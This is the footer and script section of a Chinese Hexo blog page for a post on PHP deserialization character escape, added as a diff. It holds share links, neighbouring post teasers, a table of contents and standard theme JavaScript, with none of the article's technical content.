+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.m00nback.xyz/2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/>http://www.m00nback.xyz/2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-04-26T23:05:31+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年4月26日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/web/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>web</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>反序列化</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.m00nback.xyz/2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&title=PHP反序列化字符逃逸 - 明月归的小站&summary=本篇博客主要介绍了反序列化字符逃逸的相关内容！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.m00nback.xyz/2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&title=PHP反序列化字符逃逸 - 明月归的小站&summary=本篇博客主要介绍了反序列化字符逃逸的相关内容！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.m00nback.xyz/2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&title=PHP反序列化字符逃逸 - 明月归的小站&summary=本篇博客主要介绍了反序列化字符逃逸的相关内容！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2020/05/05/Vulhub%E4%B9%8Bphp/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>Vulhub之php</p>
+                <p class='content'>本篇博客主要复现了Vulhub上的php部分漏洞！
+
+
+CVE-2012-1823漏洞简介该漏洞可导致代码执行。
+WEB 中，
+
+Web Server 一般指Apache、Nginx、IIS、L...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/04/18/NPUCTF-writeup/'>
+                <p class='title'>NPUCTF writeup<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>记一下writeup!    wtcl!
+
+
+web查源码查源码得到flag
+RealEzPHP在
+1/time.php?source
+
+看到源码
+12345678910111213141516...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%EF%BC%9F"><span class="toc-text">什么是反序列化字符逃逸？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF%E9%A2%98%E7%9B%AE"><span class="toc-text">CTF题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2020%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B"><span class="toc-text">2020安恒四月月赛</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
